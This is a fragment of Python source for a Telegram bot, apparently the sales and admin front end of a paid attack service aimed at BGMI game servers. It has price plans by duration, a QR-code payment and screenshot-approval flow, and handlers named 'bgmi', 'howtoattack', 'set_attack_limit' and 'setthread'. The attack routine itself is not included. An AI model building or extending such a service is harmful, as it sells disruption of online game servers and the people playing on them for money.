    ("₹250 = 3 DAYS ✅", "250"),
    ("₹350 = 1 WEEK ✅", "350"),
    ("₹500 = 15 DAYS ✅", "450"),
    ("₹700 = 1 MONTH ✅", "650"),
    ("₹1,200 = FULL SEASON ✅", "1100"),
]

async def start_buy(update: Update, context):
    keyboard = [[InlineKeyboardButton(text, callback_data=price)] for text, price in plans]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Select apna plan niche se:", reply_markup=reply_markup)

async def handle_plan_selection(update: Update, context):
    query = update.callback_query
    await query.answer()
    selected_plan = query.data

    # Stylish and user-friendly message with QR image
    with open("payment_qr_code.png", "rb") as qr:
        await context.bot.send_photo(
            chat_id=query.message.chat_id,
            photo=qr,
            caption=(
                f"🎉 *Plan Selected:* ₹{selected_plan}\n\n"
                "🟢 *Next Steps:*\n"
                "1️⃣ 𝙌𝙍 𝙘𝙤𝙙𝙚 𝙠𝙤 𝙨𝙘𝙖𝙣 𝙠𝙖𝙧𝙠𝙚 𝙥𝙖𝙮𝙢𝙚𝙣𝙩 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚 𝙠𝙖𝙧𝙤.\n"
                "2️⃣ 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙝𝙤𝙣𝙚 𝙠𝙚 𝙗𝙖𝙖𝙙 𝙐𝙨𝙠𝙖 𝙨𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙡𝙚 𝙡𝙤.\n"
                "3️⃣ 𝙁𝙞𝙧 𝙒𝙤 𝙨𝙘𝙧𝙚𝙚𝙣𝙨𝙝𝙤𝙩 𝙄𝙨 𝘽𝙤𝙩 𝙈𝙚 𝙃𝙞 𝙎𝙚𝙣𝙙 𝙆𝙖𝙧𝙙𝙤.\n\n"
                "⚠️ Note: 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗵𝗼𝗻𝗲 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗮𝗮𝗽𝗸𝗮 𝗽𝗹𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗸𝗮𝗿 𝗱𝗶𝘆𝗮 𝗷𝗮𝘆𝗲𝗴𝗮.\n"
                "💬 *Support Contact:* @MasterBhaiyaa "
            ),
            parse_mode="Markdown"
        )

async def handle_payment_screenshot(update: Update, context):
    user_info = update.message.from_user
    photo = await update.message.photo[-1].get_file()
    photo_path = f"{user_info.id}_payment.jpg"
    await photo.download_to_drive(photo_path)

    # Admin ko forward karna
    await context.bot.send_message(
        chat_id=ADMIN_ID,
        text=f"Payment screenshot received:\nUser: @{user_info.username or 'NoUsername'} ({user_info.id})",
    )
    await context.bot.send_photo(chat_id=ADMIN_ID, photo=open(photo_path, "rb"))
    await update.message.reply_text("✅ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗿𝗲𝗰𝗲𝗶𝘃𝗲 𝗵𝗼 𝗴𝗮𝘆𝗮 𝗵𝗮𝗶! 🔍 𝗩𝗲𝗿𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻 𝗸𝗲 𝗯𝗮𝗮𝗱 𝗮𝗮𝗽𝗸𝗮 𝗽𝗹𝗮𝗻 𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗸𝗮𝗿 𝗱𝗶𝘆𝗮 𝗷𝗮𝘆𝗲𝗴𝗮. 𝗗𝗵𝗮𝗻𝘆𝗮𝘄𝗮𝗮𝗱!")
    
import asyncio
import time

# Bot start hone ka time track karne ke liye
start_time = time.time()

async def update_uptime_timer(context, chat_id, message_id):
    while True:
        current_time = time.time()
        uptime_seconds = int(current_time - start_time)

        days = uptime_seconds // 86400
        hours = (uptime_seconds % 86400) // 3600
        minutes = (uptime_seconds % 3600) // 60
        seconds = uptime_seconds % 60

        uptime_message = "⏰ *Bot Uptime:*\n"
        if days > 0:
            uptime_message += f"📅 {days} days\n"
        uptime_message += f"⏳ {hours} hours, {minutes} minutes, {seconds} seconds\n\n"
        uptime_message += "⚡ *Live updating...*"

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=uptime_message,
                parse_mode="Markdown"
            )
        except:
            break

        await asyncio.sleep(1)  # Har second update karega

async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = await update.message.reply_text("🕒 *Calculating Uptime...*", parse_mode="Markdown")

    # Start live updating countdown
    asyncio.create_task(update_uptime_timer(context, update.message.chat_id, message.message_id))

async def start_background_tasks(app):
    asyncio.create_task(notify_expiring_users(app.bot))  # Existing notification task
    asyncio.create_task(notify_unapproved_users(app.bot))  # Naya task unapproved users ke liye

def main():
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(start_background_tasks).build()

    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("bgmi", bgmi))
    application.add_handler(CommandHandler("price", price))
    application.add_handler(CommandHandler("rule", rule))
    application.add_handler(CommandHandler("owner", owner))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("admincommand", admincommand))
    application.add_handler(CommandHandler("settime", set_attack_limit))
    application.add_handler(CommandHandler("setthread", set_thread))
    application.add_handler(CommandHandler("addadmin", addadmin))
    application.add_handler(CommandHandler("addbalance", addbalance))
    application.add_handler(CommandHandler("adminbalance", adminbalance))
    application.add_handler(CommandHandler("genkey", gen))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("removeadmin", removeadmin))
    application.add_handler(CommandHandler("removecoin", removecoin))
    application.add_handler(CommandHandler("howtoattack", howtoattack))
    application.add_handler(CommandHandler("canary", canary))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("buy", start_buy))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("setcooldown", set_cooldown))
    
    application.add_handler(CallbackQueryHandler(handle_plan_selection))
    application.add_handler(MessageHandler(filters.PHOTO, handle_payment_screenshot))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
    
